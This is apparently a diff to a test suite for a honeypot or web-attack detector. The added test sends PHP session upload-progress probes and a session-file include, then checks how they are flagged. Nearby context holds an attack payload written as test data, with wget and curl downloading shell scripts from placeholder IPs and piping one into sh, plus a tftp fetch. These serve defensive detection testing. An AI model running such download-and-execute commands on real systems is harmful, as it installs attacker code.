@@ -403,6 +403,25 @@ async def test_php2shell_lfi_followup(harness: Harness) -> None:
     assert "php2shell" in third.data["flags"] and third.data["cve"]
 
 
+async def test_upload_progress_without_php_code_is_only_a_probe(harness: Harness) -> None:
+    await get(
+        harness,
+        "POST",
+        "/",
+        body="PHP_SESSION_UPLOAD_PROGRESS=hello",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    await get(harness, "GET", "/index.php?PHP_SESSION_UPLOAD_PROGRESS=1")
+    await get(harness, "GET", "/index.php?file=/tmp/sess_neverseen")  # a bare session include
+    events = by_type(await harness.events(), "http_request")
+    for ev in events[-3:-1]:
+        assert "upload_progress" in ev.data["flags"] and "php2shell" not in ev.data["flags"]
+        assert not ev.data["cve"]
+    last = events[-1]
+    assert "session_include" in last.data["flags"] and "php2shell" not in last.data["flags"]
+    assert not last.data["cve"]
+
+
 async def test_download_attempts_recorded_only(harness: Harness) -> None:
     payload = "cmd=cd /tmp; wget http://198.51.100.7/x.sh -O x; curl -s http://203.0.113.9/y|sh; tftp -g -r z 192.0.2.5"
     await get(harness, "POST", "/index.php", body=payload, headers={"Content-Type": "text/plain"})
